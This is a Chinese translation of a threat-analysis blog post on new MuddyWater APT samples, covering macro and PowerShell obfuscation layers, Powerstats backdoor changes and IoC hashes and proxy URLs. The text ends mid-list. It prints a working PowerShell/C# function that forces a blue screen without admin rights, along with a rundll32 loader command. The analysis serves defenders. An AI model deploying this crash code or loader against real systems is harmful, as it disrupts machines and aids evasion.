> 原文链接: https://www.anquanke.com//post/id/113594 


# 针对APT攻击组织MuddyWater新样本的分析


                                阅读量   
                                **111122**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://sec0wn.blogspot.ae/
                                <br>原文地址：[https://sec0wn.blogspot.ae/2018/05/clearing-muddywater-analysis-of-new.html](https://sec0wn.blogspot.ae/2018/05/clearing-muddywater-analysis-of-new.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01e740ff8c5d88a1ff.jpg)](https://p0.ssl.qhimg.com/t01e740ff8c5d88a1ff.jpg)

## 概述

自从我上次对MuddyWater（该样本也被FireEye命名为Temp.Zagros，相关链接： [https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html](https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html) ）进行分析（ [https://sec0wn.blogspot.ae/2018/03/a-quick-dip-into-muddywaters-recent.html](https://sec0wn.blogspot.ae/2018/03/a-quick-dip-into-muddywaters-recent.html) ）以来，已经过去了两个多月。我本以为这一组织会休息一段时间，但事实证明我的想法是错误的。在本周，我发现了一些该组织发布的新型样本。尽管这些新样本与此前的样本存在诸多相似之处，但仍然有许多新增的特性，并且在新样本中他们进行了混淆。该组织仍然将重点放在了分层混淆（Layered Obfuscation）和PowerShell上面。本文将主要分析该组织发布的新样本，并与此前的样本进行对比。<br>
下面是该组织近期使用的一些诱饵文档的截图，这些文档的哈希值附在了文末。<br>[![](https://4.bp.blogspot.com/-Y0CWMk7c4sM/WvHBQYvwugI/AAAAAAAA9Ac/vfy5MxBPcFoAGqDCywgUmnppD8GSoNrxACLcBGAs/s1600/Election%2BPakistan.jpg)](https://4.bp.blogspot.com/-Y0CWMk7c4sM/WvHBQYvwugI/AAAAAAAA9Ac/vfy5MxBPcFoAGqDCywgUmnppD8GSoNrxACLcBGAs/s1600/Election%2BPakistan.jpg)<br>[![](https://1.bp.blogspot.com/-Tdv7KPm1Tig/WvHBQj6IlYI/AAAAAAAA9Ag/_AfVKzjO3AkUAyqrtk2IHV_DE_n1HRGrwCLcBGAs/s1600/Invest%2Bin%2BTurkey.png)](https://1.bp.blogspot.com/-Tdv7KPm1Tig/WvHBQj6IlYI/AAAAAAAA9Ag/_AfVKzjO3AkUAyqrtk2IHV_DE_n1HRGrwCLcBGAs/s1600/Invest%2Bin%2BTurkey.png)<br>[![](https://2.bp.blogspot.com/-FZVVescxMpg/WvHBQKRYNcI/AAAAAAAA9AY/464CaD3YP208zTlDPY0FWUj-hFUhLT4EQCLcBGAs/s1600/IQMOFA.png)](https://2.bp.blogspot.com/-FZVVescxMpg/WvHBQKRYNcI/AAAAAAAA9AY/464CaD3YP208zTlDPY0FWUj-hFUhLT4EQCLcBGAs/s1600/IQMOFA.png)<br>[![](https://2.bp.blogspot.com/-HnGYvXSgQOk/WvHBRbf6yhI/AAAAAAAA9Ao/fjK43_U8pgU4r9jMOqEMoEqBlavXxrcBgCLcBGAs/s1600/National%2BAssembly%2Bof%2BPakistan.png)](https://2.bp.blogspot.com/-HnGYvXSgQOk/WvHBRbf6yhI/AAAAAAAA9Ao/fjK43_U8pgU4r9jMOqEMoEqBlavXxrcBgCLcBGAs/s1600/National%2BAssembly%2Bof%2BPakistan.png)<br>[![](https://4.bp.blogspot.com/-2dehnbgcYxI/WvHBRdY2h7I/AAAAAAAA9Ak/EXNHGOo1LK4aZnTW6Uig-x2eGbyb4l34wCLcBGAs/s1600/Turkish%2BSecurity%2BGuidelines.jpg)](https://4.bp.blogspot.com/-2dehnbgcYxI/WvHBRdY2h7I/AAAAAAAA9Ak/EXNHGOo1LK4aZnTW6Uig-x2eGbyb4l34wCLcBGAs/s1600/Turkish%2BSecurity%2BGuidelines.jpg)<br>
我们可以从上述截图中看到，该组织仍然将攻击的目标对准了中东地区国家（土耳其和伊拉克）以及巴基斯坦。正如我在此前的分析文章中（ [https://sec0wn.blogspot.ae/2017/11/continued-activity-targeting-middle.html](https://sec0wn.blogspot.ae/2017/11/continued-activity-targeting-middle.html) ）所指出，这些诱饵文档重点针对一些特定的组织和行业。<br>
根据发布日期，这些诱饵文档是从2月中旬到5月6日的最新样本，我也将持续关注。该样本名称为“mofa.gov.iq.doc”，其MD5为94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad，其中的“MOFA”是外交部（Ministry of Foreign Affairs）的缩写。



## 从宏到Powerstats后门：对样本的详细分析

在这里，我将对样本进行详细分析。我们重点对恶意组织所使用的混淆模型，以及Powerstats后门中的新增特性进行分析。<br>
该文档包含一个带有多个Base64编码内容的宏代码，如下所示：<br>[![](https://3.bp.blogspot.com/-bHMYJa8nevw/WvHHtBrbQLI/AAAAAAAA9BA/MRiKUT0jkGY9FAm-UG0ECXLbvC1HZX-2QCLcBGAs/s1600/Macro%2BCode.PNG)](https://3.bp.blogspot.com/-bHMYJa8nevw/WvHHtBrbQLI/AAAAAAAA9BA/MRiKUT0jkGY9FAm-UG0ECXLbvC1HZX-2QCLcBGAs/s1600/Macro%2BCode.PNG)<br>[![](https://4.bp.blogspot.com/-DnKKgEGnXOo/WvHHt_2OeDI/AAAAAAAA9BE/Iyf8XcFglyU51Tcn-IY4-ZO24trRsloHwCLcBGAs/s1600/first%2BBas64.PNG)](https://4.bp.blogspot.com/-DnKKgEGnXOo/WvHHt_2OeDI/AAAAAAAA9BE/Iyf8XcFglyU51Tcn-IY4-ZO24trRsloHwCLcBGAs/s1600/first%2BBas64.PNG)<br>[![](https://3.bp.blogspot.com/-nl-_wje3yts/WvHHt2T0h-I/AAAAAAAA9BI/HL07CV7vdOo5BUetIfvRti634ZCRnoqzACLcBGAs/s1600/second%2BBase64.PNG)](https://3.bp.blogspot.com/-nl-_wje3yts/WvHHt2T0h-I/AAAAAAAA9BI/HL07CV7vdOo5BUetIfvRti634ZCRnoqzACLcBGAs/s1600/second%2BBase64.PNG)<br>[![](https://2.bp.blogspot.com/-MBrlmxTi_H8/WvHHt9D0SEI/AAAAAAAA9BQ/S46NzieRz9Yv-yaecRDcPBYDOgBjlsagwCLcBGAs/s1600/third%2BBase64.PNG)](https://2.bp.blogspot.com/-MBrlmxTi_H8/WvHHt9D0SEI/AAAAAAAA9BQ/S46NzieRz9Yv-yaecRDcPBYDOgBjlsagwCLcBGAs/s1600/third%2BBase64.PNG)<br>
其中，第一个Base64编码的变量，解码后实际是另一个编码数据块，如下所示。我们将在后面详细分析。<br>[![](https://3.bp.blogspot.com/-bpEpjPEzUtg/WvHJHKJ7ipI/AAAAAAAA9Bk/Vr77Eh68BwM-cZdN4UjqdYAFM1G1s-NgQCLcBGAs/s1600/Encoded%2BData.PNG)](https://3.bp.blogspot.com/-bpEpjPEzUtg/WvHJHKJ7ipI/AAAAAAAA9Bk/Vr77Eh68BwM-cZdN4UjqdYAFM1G1s-NgQCLcBGAs/s1600/Encoded%2BData.PNG)<br>
第二个Base64编码后的变量，解码后得到“c:windowssystem32rundll32.exe advpack.dll,LaunchINFSection C:ProgramDataEventManager.logs,Defender,1,”。<br>
第三个Base64编码后的变量，解码后得到包含混淆Java脚本的编码后XML文件，如下所示：<br>[![](https://1.bp.blogspot.com/-pAKXoxEzKS4/WvHLm5vf75I/AAAAAAAA9Bw/O63rUDBLTy0-IR4RVv7oBPN1U5zckn_nwCLcBGAs/s1600/Encoded%2BXML%2Band%2BJavaScript.PNG)](https://1.bp.blogspot.com/-pAKXoxEzKS4/WvHLm5vf75I/AAAAAAAA9Bw/O63rUDBLTy0-IR4RVv7oBPN1U5zckn_nwCLcBGAs/s1600/Encoded%2BXML%2Band%2BJavaScript.PNG)<br>
我们对嵌入在XML文件中的JavaScript进行解码，得到如下结果：<br>[![](https://1.bp.blogspot.com/-Zv1oxGvqx38/WvHMDLd_i0I/AAAAAAAA9B4/Gz3WKR9Q7rsMonMT0EBvPSslWPgDdM-UACLcBGAs/s1600/decoded%2BJS%2Bscript.PNG)](https://1.bp.blogspot.com/-Zv1oxGvqx38/WvHMDLd_i0I/AAAAAAAA9B4/Gz3WKR9Q7rsMonMT0EBvPSslWPgDdM-UACLcBGAs/s1600/decoded%2BJS%2Bscript.PNG)<br>
解码后的脚本实际上是一个PowerShell脚本，该脚本对名为“C:ProgramDataWindowsDefenderService.ini ”的文件执行进一步的解码例程。<br>
该文件的内容实际上来自第一个Base64块的编码数据。在解码后，我们发现该内容非常熟悉，是Powerstats后门的变体。<br>
首先，解码数据块后，我们得到了编码后的PowerShell，如下所示：<br>[![](https://2.bp.blogspot.com/-RtbCdbLHO9s/WvHZIx4M1LI/AAAAAAAA9CI/DrktZ4Kgh74uMCF9DA0_1xcWfWToB1s2QCLcBGAs/s1600/first%2BPS%2Bencoding.PNG)](https://2.bp.blogspot.com/-RtbCdbLHO9s/WvHZIx4M1LI/AAAAAAAA9CI/DrktZ4Kgh74uMCF9DA0_1xcWfWToB1s2QCLcBGAs/s1600/first%2BPS%2Bencoding.PNG)<br>
请注意，这里使用的iex是Invoke-Expression的变体。为了得到这里的输出结果，我们用Write-Output替换iex，得到以下内容：<br>[![](https://1.bp.blogspot.com/-xw8mroV-Z8U/WvHbR9gZvYI/AAAAAAAA9CU/cL9tTHlQcikIq9sy5N6Ou_0SaQtwW93agCLcBGAs/s1600/first%2BPS%2Bdecoding.PNG)](https://1.bp.blogspot.com/-xw8mroV-Z8U/WvHbR9gZvYI/AAAAAAAA9CU/cL9tTHlQcikIq9sy5N6Ou_0SaQtwW93agCLcBGAs/s1600/first%2BPS%2Bdecoding.PNG)<br>
尽管上述内容看起来比较乱，但内容有些眼熟，应该是使用了字符替换函数进行字符替换。在上图中，我们可以看到“&amp;((vaRIABle ‘**MDR**‘).NAME[3,11,2]-jOiN’’)”，这实际上是Invoke-Expression混淆后的结果。这样一来，我们依然可以用Write-Output来替换它，得到如下结果：<br>[![](https://3.bp.blogspot.com/-hGn3eXCyi4c/WvHhL2glk6I/AAAAAAAA9Ck/lYQ_Ow38JuwgWj2HdUFrzaBwLKj4mV4VwCLcBGAs/s1600/second%2BPS%2Bdecoded.PNG)](https://3.bp.blogspot.com/-hGn3eXCyi4c/WvHhL2glk6I/AAAAAAAA9Ck/lYQ_Ow38JuwgWj2HdUFrzaBwLKj4mV4VwCLcBGAs/s1600/second%2BPS%2Bdecoded.PNG)<br>
同样地，我们再次注意到其中有一个“( $enV:ComSpEc[4,24,25]-jOiN’’)”，这是iex。这也就意味着，我们可以继续用Write-Output对其进行替换。<br>
实际上，这是多层混淆，我们可以一直采用此方法进行替换，最终获得我们能看懂的解码后脚本。在该脚本中，包含了代理URL和IP标识，如下所示：<br>[![](https://4.bp.blogspot.com/-E6neiTXxGZI/WvHjmTNMKVI/AAAAAAAA9Cw/zF61ggflCbAqcu9d22b8Iq-KNqGz8vAwwCLcBGAs/s1600/final%2Bdecoded%2BPS.PNG)](https://4.bp.blogspot.com/-E6neiTXxGZI/WvHjmTNMKVI/AAAAAAAA9Cw/zF61ggflCbAqcu9d22b8Iq-KNqGz8vAwwCLcBGAs/s1600/final%2Bdecoded%2BPS.PNG)<br>
当然，这只是大量编码后的PowerShell脚本中的第一部分，第二部分和第三部分是该后门的实际功能。



## 新样本的变化

在上一篇博客中，我分析的大部分功能仍然存在于新变体之中。除此之外，在新样本中还有一些新增的功能，也对一些功能做了修改：<br>
1、屏幕截图功能的代码被重新编写，但仍然保持了原有的功能。新变体会截取被感染用户的屏幕截图，将其保存为PNG格式，并转换为字节，使用Base64对其进行编码，然后上传至C&amp;C服务器。<br>[![](https://1.bp.blogspot.com/-xxxqD_np2Y8/WvHqGd6c50I/AAAAAAAA9DA/pJ_NRVqn4Gc3mECjfQp0fpfhO2fflv7xgCLcBGAs/s1600/Screenshot%2Bfunction%2Band%2Bencode.PNG)](https://1.bp.blogspot.com/-xxxqD_np2Y8/WvHqGd6c50I/AAAAAAAA9DA/pJ_NRVqn4Gc3mECjfQp0fpfhO2fflv7xgCLcBGAs/s1600/Screenshot%2Bfunction%2Band%2Bencode.PNG)<br>
2、在新样本中，我发现在特定过程中，包含了可以导致蓝屏死机（BSOD）的代码。这部分使用了反调试和反分析技术。<br>[![](https://3.bp.blogspot.com/-5aMA8Famwto/WvHwKmSjhQI/AAAAAAAA9DQ/d2njYgIBLToBLYAaeLpRlShc19L7IwOnwCLcBGAs/s1600/Looking%2Bfor%2BVM%2BProcesses.PNG)](https://3.bp.blogspot.com/-5aMA8Famwto/WvHwKmSjhQI/AAAAAAAA9DQ/d2njYgIBLToBLYAaeLpRlShc19L7IwOnwCLcBGAs/s1600/Looking%2Bfor%2BVM%2BProcesses.PNG)<br>
在上图的最下面，我们高亮标出了“GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG”函数，该函数的代码如下：

```
function GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG(){
$s = @"
using System;
using System.Runtime.InteropServices;
public static class C{
[DllImport("ntdll.dll")]
public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
[DllImport("ntdll.dll")]
public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
public static unsafe void Kill(){
Boolean tmp1;
uint tmp2;
RtlAdjustPrivilege(19, true, false, out tmp1);
NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
}
}
"@
$c = new-object -typename system.CodeDom.Compiler.CompilerParameters
$c.CompilerOptions = '/unsafe'
$a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c
[C]::Kill()
}
```

这是在一个月前，由Barrett Adams ([@peewpw](https://github.com/peewpw), [https://twitter.com/peewpw](https://twitter.com/peewpw) )编写的导致BSOD的代码，该代码可以从他的GitHub页面上找到（ [https://github.com/peewpw/Invoke-BSOD/blob/master/Invoke-BSOD.ps1](https://github.com/peewpw/Invoke-BSOD/blob/master/Invoke-BSOD.ps1) ）。有一点需要注意，这段代码无需管理员权限执行，即可导致BSOD。<br>
如果在受感染系统上存在cmd.exe或PowerShell.exe或Powershell_ISE.exe进程，也会执行相同的函数和代码。<br>
3、此外，还有一个功能，是在ProgramData文件夹中查找是否存在字符串“Kasper”、“Panda”和“ESET”。如果存在，将会中断屏幕截图功能和上传功能。



## 总结

该恶意组织似乎持续活动，并且针对不同的国家发动攻击。在他们此次发动的攻击中，具有如下特点：<br>
1、在Powerstats变体的基础上，使用了Base64 —&gt; XML中的混淆JS —&gt; PowerShell字符，为主要后门代码增加了一层额外的模糊处理。<br>
2、更新了部分Powerstats代码，增加了BSOD功能，从而对抗分析与调试过程。<br>
3、只依靠DDEInitiate进行横向移动，该组织似乎已经放弃了之前样本中使用过的另外两种方法。



## IoC

### <a class="reference-link" name="%E5%93%88%E5%B8%8C%E5%80%BC"></a>哈希值

94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad<br>
5c7d16bd89ef37fe02cac1851e7214a01636ee4061a80bfdbde3a2d199721a79<br>
76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338<br>
707d2128a0c326626adef0d3a4cab78562abd82c2bd8ede8cc82f86c01f1e024<br>
b7b8faac19a58548b28506415f9ece479055e9af0557911ca8bbaa82b483ffb8<br>
18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd

### <a class="reference-link" name="%E4%BB%A3%E7%90%86%E5%88%97%E8%A1%A8"></a>代理列表

hxxp://alessandrofoglino[.]com//wp-config-ini.php<br>
hxxps://www.theharith[.]com/wp-includes/wp-config-ini.php<br>
hxxp://www.easy-home-sales[.]co.za//wp-config-ini.php<br>
hxxps://amishcountryfurnishings[.]com/awstats/wp-config-ini.php<br>
hxxp://chinamall[.]co.za//wp-config-ini.php<br>
hxxp://themotoringcalendar[.]co.za//wp-config-ini.php<br>
hxxp://bluehawkbeats[.]com//wp-config-ini.php<br>
hxxp://www.gilforsenate[.]com//wp-config-ini.php<br>
hxxp://answerstoprayer[.]org//wp-config-ini.php<br>
hxxp://mgamule[.]co.za/oldweb/wp-config-ini.php<br>
hxxp://chrisdejager-attorneys[.]co.za//wp-config-ini.php<br>
hxxp://finalnewstv[.]com//wp-config-ini.php<br>
hxxps://www.brand-stories.gr//wp-config-ini.php<br>
hxxp://www.duotonedigital[.]co.za//wp-config-ini.php<br>
hxxp://www.britishasia-equip[.]co.uk//wp-config-ini.php<br>
hxxp://www.tanati[.]co.za//wp-config-ini.php<br>
hxxp://emware[.]co.za//wp-config-ini.php<br>
hxxp://breastfeedingbra[.]co.za//wp-config-ini.php<br>
hxxp://www.androidwikihow[.]com//wp-config-ini.php<br>
hxxp://cashforyousa[.]co.za//wp-config-ini.php<br>
hxxp://hesterwebber[.]co.za//wp-config-ini.php<br>
hxxp://bramloosveld.be/trainer/wp-config-ini.php<br>
hxxp://fickstarelectrical[.]co.za//wp-config-ini.php<br>
hxxp://buchnation[.]com//wp-config-ini.php<br>
hxxp://hostingvalley[.]co.uk/downloads/wp-config-ini.php<br>
hxxp://bluefor[.]com/magento/wp-config-ini.php<br>
hxxp://foryou.guru/css/wp-config-ini.php<br>
hxxp://www.daleth[.]co.za//wp-config-ini.php<br>
hxxps://www.buyandenjoy.pk//wp-config-ini.php<br>
hxxps://annodle[.]com/wp-includes/wp-config-ini.php<br>
hxxp://goldeninstitute[.]co.za/contents/wp-config-ini.php<br>
hxxp://advss[.]co.za/images/wp-config-ini.php<br>
hxxp://ednpk[.]com//wp-config-ini.php<br>
hxxp://proeventsports[.]co.za/wp-admin/wp-config-ini.php<br>
hxxp://glenbridge[.]co.za//wp-config-ini.php<br>
hxxp://berped[.]co.za//wp-config-ini.php<br>
hxxp://best-digital-slr-cameras[.]com//wp-config-ini.php<br>
hxxps://kamas.pk//wp-config-ini.php<br>
hxxps://bekkersweldingservice.nl//wp-config-ini.php<br>
hxxp://bogdanandreescu.fit//wp-config-ini.php<br>
hxxp://www.bashancorp[.]co.za//wp-config-ini.php<br>
hxxps://www.bmcars.nl/wp-admin/wp-config-ini.php<br>
hxxp://visionclinic[.]co.ls/visionclinic/wp-config-ini.php<br>
hxxps://www.antojoentucocina[.]com//wp-config-ini.php<br>
hxxp://www.ihlosiqs-pm[.]co.za//wp-config-ini.php<br>
hxxp://capitalradiopetition[.]co.za//wp-config-ini.php<br>
hxxp://www.generictoners[.]co.za//wp-config-ini.php<br>
hxxp://almaqsd[.]com/wp-includes/wp-config-ini.php<br>
hxxp://www.alessioborzuola[.]com/downloads/wp-config-ini.php<br>
hxxp://briskid[.]com//wp-config-ini.php<br>
hxxp://bios-chip[.]co.za//wp-config-ini.php<br>
hxxp://www.crissamconsulting[.]co.za//wp-config-ini.php<br>
hxxp://capriflower[.]co.za//wp-config-ini.php<br>
hxxp://www.dingaanassociates[.]co.za//wp-config-ini.php<br>
hxxp://batistadopovosjc[.]org.br//wp-config-ini.php<br>
hxxp://indiba-africa[.]co.za//wp-config-ini.php<br>
hxxp://apollonweb[.]com//wp-config-ini.php<br>
hxxps://www.amighini.it/webservice/wp-config-ini.php<br>
hxxp://blackrabbitthailand[.]com//wp-config-ini.php<br>
hxxp://batthiqbal[.]com/sagenda/webroot/wp-config-ini.php<br>
hxxp://clandecor[.]co.za/rvsUtf8Backup/wp-config-ini.php<br>
hxxp://bakron[.]co.za//wp-config-ini.php<br>
hxxp://gsnconsulting[.]co.za//wp-config-ini.php<br>
hxxp://vumavaluations[.]co.za//wp-config-ini.php<br>
hxxp://heritagetravelmw[.]com//wp-config-ini.php<br>
hxxp://www.moboradar[.]com/wp-includes/wp-config-ini.php<br>
hxxps://news9pakistan[.]com/wp-includes/wp-config-ini.php<br>
hxxp://havilahglo[.]co.za/wpscripts/wp-config-ini.php<br>
hxxp://binaries.site/wink/wp-config-ini.php<br>
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/wp-config-ini.php<br>
hxxp://clouditzone[.]com/revolution/assets/wp-config-ini.php<br>
hxxp://delectronics[.]com.pk//wp-config-ini.php<br>
hxxps://boudua[.]com//wp-config-ini.php<br>
hxxp://baynetins[.]com//wp-config-ini.php<br>
hxxp://insafradio.pk/pos/wp-config-ini.php<br>
hxxp://www.harmonyguesthouse[.]co.za//wp-config-ini.php<br>
hxxp://fsproperties[.]co.za/engine1/wp-config-ini.php<br>
hxxp://desirablehair[.]co.za//wp-config-ini.php<br>
hxxp://comsip[.]org.mw//wp-config-ini.php<br>
hxxp://www.wbdrivingschool[.]com//wp-config-ini.php<br>
hxxp://jdcorporate[.]co.za/catalog/wp-config-ini.php<br>
hxxp://bradleysherrer[.]com/wp/wp-config-ini.php<br>
hxxp://debnoch[.]com/image/wp-config-ini.php<br>
hxxp://adsbook[.]co.za//wp-config-ini.php<br>
hxxp://host4unix.net/host24new/wp-config-ini.php<br>
hxxp://jvpsfunerals[.]co.za//wp-config-ini.php<br>
hxxp://immaculatepainters[.]co.za//wp-config-ini.php<br>
hxxp://tcpbereka[.]co.za/js/wp-config-ini.php<br>
hxxp://investaholdings[.]co.za/htc/wp-config-ini.php<br>
hxxp://tuules[.]com//wp-config-ini.php<br>
hxxp://findinfo-more[.]com//wp-config-ini.php<br>
hxxp://bmorecleaning[.]com//wp-config-ini.php<br>
hxxp://www.goolineb2b[.]com//wp-config-ini.php<br>
hxxp://www.triconfabrication[.]com/wp-includes/wp-config-ini.php<br>
hxxp://irshadfoundation[.]co.za//wp-config-ini.php<br>
hxxp://www.blattoamsterdam[.]com//wp-config-ini.php<br>
hxxp://ladiescircle[.]co.za//wp-config-ini.php<br>
hxxp://domesticguardians[.]co.za/Banner/wp-config-ini.php<br>
hxxp://jhphotoedits[.]co.za//wp-config-ini.php<br>
hxxp://iqra[.]co.za/pub/wp-config-ini.php<br>
hxxps://bestbedra
